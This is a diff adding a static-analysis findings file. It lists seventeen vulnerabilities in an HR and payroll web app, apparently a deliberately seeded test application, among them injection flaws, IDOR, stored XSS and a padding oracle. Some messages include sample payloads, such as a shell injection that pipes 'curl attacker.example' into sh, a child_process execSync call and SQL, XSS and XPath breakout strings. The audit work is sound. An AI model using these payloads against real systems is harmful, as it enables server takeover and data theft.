@@ -1,0 +1,436 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.auth.password-reset-token-not-bound-to-account",
+      "path": "app/services/auth.server.ts",
+      "start": {
+        "line": 286,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 298,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resetPassword() looks up the target user strictly by the email supplied in the request, and separately looks up the reset token strictly by its hash \u2014 it never verifies that reset.userId matches user.id. An attacker can request a legitimate password-reset token for their OWN account (via the 'request' intent on /reset-password, which even echoes the demo token back), then submit the reset form with intent=reset, their own valid token, but the VICTIM's email address. Because the two records are never cross-checked, the code updates the victim account's passwordHash while consuming the attacker's own token, allowing full account takeover of any user whose email is known.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-640: Weak Password Recovery Mechanism for Forgotten Password"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.idor.compensation-receipt-missing-authz",
+      "path": "app/routes/compensation.record.$recordId.receipt.tsx",
+      "start": {
+        "line": 20,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 28,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The loader fetches a compensationRecords row purely by the $recordId route parameter and returns salary/bonus data after only calling requireUser() (any authenticated role). Unlike the sibling route compensation.record.$recordId.summary.tsx, it never calls assertCanViewCompensation(user, record.employeeId). Any logged-in employee can enumerate recordId values in the URL to view any other employee's salary and bonus (an IDOR / broken object-level authorization).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.code-injection-function-constructor",
+      "path": "app/services/workflows.server.ts",
+      "start": {
+        "line": 526,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 529,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "evaluateCompensationProjectionFormula builds `new Function(...Object.keys(params), 'return (' + formula + ');')` where `formula` is taken verbatim from the `formula` query-string parameter in app/routes/compensation.projection-formula.tsx and executed server-side. Any hr_admin/payroll_specialist-authenticated request can supply an arbitrary JavaScript expression (e.g. `require('child_process').execSync('...')` depending on Node module scope, or at minimum arbitrary computation/DoS/global object access) that is evaluated inside the Node process, resulting in server-side code injection.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')",
+            "CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection-department-search",
+      "path": "app/services/reconciliation.server.ts",
+      "start": {
+        "line": 81,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 91,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchCompensationHistoryByDepartment builds a raw SQL query with the user-supplied `department` query-string value concatenated directly into the string passed to pool.query() (`where d.name = '${departmentTerm}'`), reachable from app/routes/compensation.history-by-department.tsx. An hr_admin/payroll_specialist can inject SQL via the `department` parameter, e.g. `' UNION SELECT ... --`, to read arbitrary data or break out of the intended query.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-pandoc-export",
+      "path": "app/services/files.server.ts",
+      "start": {
+        "line": 65,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 76,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "convertDocumentForExport builds a shell command string `pandoc ${fullPath} -t ${format}` and runs it with exec() (which invokes /bin/sh). The `format` value comes straight from the `format` query-string parameter in app/routes/documents.$documentId.export-format.tsx with no allowlist or escaping, letting an authenticated document viewer inject shell metacharacters (e.g. `format=pdf; curl attacker.example|sh`) to execute arbitrary OS commands on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-iconv-transcode",
+      "path": "app/services/files.server.ts",
+      "start": {
+        "line": 197,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 214,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "transcodeExportForPartnerLocale spawns `iconv -f utf-8 -t ${localePreset}` with `shell: true`, where localePreset is taken directly from the `charset` query-string parameter in app/routes/exports.payroll-legacy-feed.tsx with no validation (unlike the paired *-verified route, which allowlists presets). An hr_admin/payroll_specialist can inject shell metacharacters via `charset` to execute arbitrary commands during payroll export.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.auth.missing-authentication-shift-summary",
+      "path": "app/routes/field-crew.shift-summary.tsx",
+      "start": {
+        "line": 1,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 16,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "This loader never calls requireUser/requireRole or validates any session. It trusts the client-supplied `x-account-id` header as the employee identity and returns that employee's name, employee number, and derived hourly pay rate. Any unauthenticated network caller can enumerate account IDs via this header to exfiltrate other employees' personal and compensation-derived data \u2014 compare to field-crew.shift-summary-verified.tsx, which requires an authenticated session and only returns the caller's own data.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.mass-assignment.screening-vendor-decision",
+      "path": "app/services/screeningIntake.server.ts",
+      "start": {
+        "line": 28,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 41,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyScreeningVendorDecision parses arbitrary JSON from the unauthenticated `x-screening-vendor-result` request header (route app/routes/onboarding.screening-intake.tsx has no auth check at all) and, whenever `access == true`, spreads the entire parsed object directly into `db.update(onboardingTasks).set({...(result as any), updatedAt: new Date()})`. Any caller can supply extra fields (e.g. reviewerId, evidenceDocumentId, completedAt, status) beyond the intended access decision, overwriting arbitrary columns of any onboarding task row it can address via `taskId` \u2014 a classic mass-assignment vulnerability with no request-origin verification. Compare to applyScreeningVendorDecisionVerified, which restricts updates to an explicit field allowlist.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes",
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.partner-tier-compensation-escalation",
+      "path": "app/services/integrations.server.ts",
+      "start": {
+        "line": 18,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 30,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "buildPartnerDirectoryFeedForTier grants access to compensation records whenever the client-supplied `x-partner-tier` header equals 2, without checking the caller's actual API-key role. Reachable via app/routes/api.directory-sync-tiered.tsx, any partner API key with role payroll_specialist (or hr_admin) can simply send `x-partner-tier: 2` to receive full salary/bonus data, whereas the paired secure implementation (buildPartnerDirectoryFeedForTierSecure) explicitly restricts tier-2 compensation data to keys with role === 'hr_admin' only. This is a client-controlled authorization decision.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.stored-xss-print-tag-script-context",
+      "path": "app/components/ui.tsx",
+      "start": {
+        "line": 38,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 49,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderPrintTagScript embeds `documentTitle` directly inside a `<script>` block (`var printTag = \"${documentTitle}\";`) with no escaping. The title originates from user-supplied document/task titles (set via the upload forms in app/routes/documents._index.tsx and app/routes/tasks.$taskId.tsx) and is rendered unescaped by app/routes/documents.$documentId.print-tag.tsx. A title such as `\";alert(document.cookie);//` breaks out of the string literal and executes arbitrary JavaScript in the viewer's session \u2014 a stored XSS. The sibling renderPrintTagScriptSafely correctly JS-escapes the value.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.stored-xss-mailroom-manifest",
+      "path": "app/components/ui.tsx",
+      "start": {
+        "line": 12,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 23,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderMailroomManifestHtml interpolates documentTitle, recipientName, and category directly into an HTML response with no escaping (unlike renderFileLabelHtml, which calls escapeHtml on the same kind of values). Reachable via app/routes/documents.$documentId.manifest.tsx, a document title or employee name containing HTML/script tags is rendered verbatim, resulting in stored XSS against anyone who opens the mailroom manifest for that document.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor-directory-scope-cookie",
+      "path": "app/services/authz.server.ts",
+      "start": {
+        "line": 135,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 146,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolveClaimedDirectoryScope trusts a client-controlled `directoryScope` cookie as the department ID to filter by for manager users, with no check that the manager actually manages or belongs to that department. Reachable via app/routes/directory.tsx, any manager can set `Cookie: directoryScope=<any department id>` to view the full employee directory (names, titles, emails) of a department they have no relationship to.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection-badge-lookup",
+      "path": "app/services/directoryService.server.ts",
+      "start": {
+        "line": 29,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 32,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "findStaffByBadgeId builds an LDAP-style filter string `(employeeID=${badgeId})` directly from the `badgeId` query parameter (app/routes/directory.staff-lookup.tsx) without escaping LDAP metacharacters. evaluateFilter treats `*` as a wildcard, so a value such as `*` or `*)(department=Finance` alters the search semantics, letting an hr_admin/manager retrieve directory records outside the intended single-badge lookup. The paired findStaffByBadgeIdSafely correctly escapes filter metacharacters via escapeLdapFilterValue.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.xpath-injection-policy-audience",
+      "path": "app/services/policyIndex.server.ts",
+      "start": {
+        "line": 17,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 22,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "findPoliciesByAudienceXPath builds an XPath-like expression by interpolating the `audience` query parameter directly (`/policies/policy[@audience='${audience}']`), reachable from app/routes/policies.directory-search.tsx behind only requireUser (any role). policyMatchesAudiencePredicate even implements a classic `' or 'a'='a` tautology bypass, so a value like `x' or '1'='1` matches every policy regardless of its configured audience, letting a low-privilege employee enumerate policy catalog entries meant for other roles. The paired findPoliciesByAudienceXPathSafely escapes the value first.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-643: Improper Neutralization of Data within XPath Expressions"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.nosql-operator-injection-staff-directory",
+      "path": "app/services/directoryCache.server.ts",
+      "start": {
+        "line": 19,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 37,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "queryStaffDirectory passes the raw JSON request body (app/routes/directory.staff-query.tsx, POST body under requireRole hr_admin/manager/payroll_specialist) straight into matchesFilter, which honors MongoDB-style operators ($ne, $gt, $regex) supplied by the caller. A client can send a filter like `{\"role\":{\"$ne\":\"\"}}` or a catastrophic `$regex` to bypass the intended equality filters and enumerate directory records outside the intended query shape (or cause ReDoS via an attacker-controlled regex). The paired queryStaffDirectorySafely validates the filter with a strict zod schema first.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-943: Improper Neutralization of Special Elements in Data Query Logic"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.cbc-padding-oracle-dispute-token",
+      "path": "app/services/crypto.server.ts",
+      "start": {
+        "line": 12,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 35,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "sealDisputeContinuation/openDisputeContinuation use AES-256-CBC with no MAC/authentication tag, and openDisputeContinuation returns a distinct error message when PKCS#7 unpadding fails ('Continuation token padding is invalid.') versus other decryption failures. This distinguishable behavior is a textbook CBC padding oracle: an attacker who can submit crafted ciphertext to the /compensation/record/:recordId/dispute action and observe which error is returned can decrypt or forge continuation tokens byte-by-byte without knowing the key. The paired sealDisputeContinuationSecure/openDisputeContinuationSecure use AES-256-GCM with tag verification and a single generic error, closing the oracle.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-327: Use of a Broken or Risky Cryptographic Algorithm",
+            "CWE-203: Observable Discrepancy"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.client-controlled-bcrypt-cost-factor",
+      "path": "app/services/auth.server.ts",
+      "start": {
+        "line": 176,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 182,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "registerTabletUnlockPin accepts a client-supplied `strengthTier` (from the `strengthTier` form field in app/routes/devices.tablet-pin.tsx) and uses it directly as the bcrypt cost factor for hashing the tablet unlock PIN, defaulting to only 4 rounds if unset. A client can request `strengthTier=1`, drastically weakening the hash for an offline brute-force of the (typically low-entropy, 4+ digit) PIN. The paired registerTabletUnlockPinSecure hardcodes 12 rounds.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-916: Use of Password Hash With Insufficient Computational Effort"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
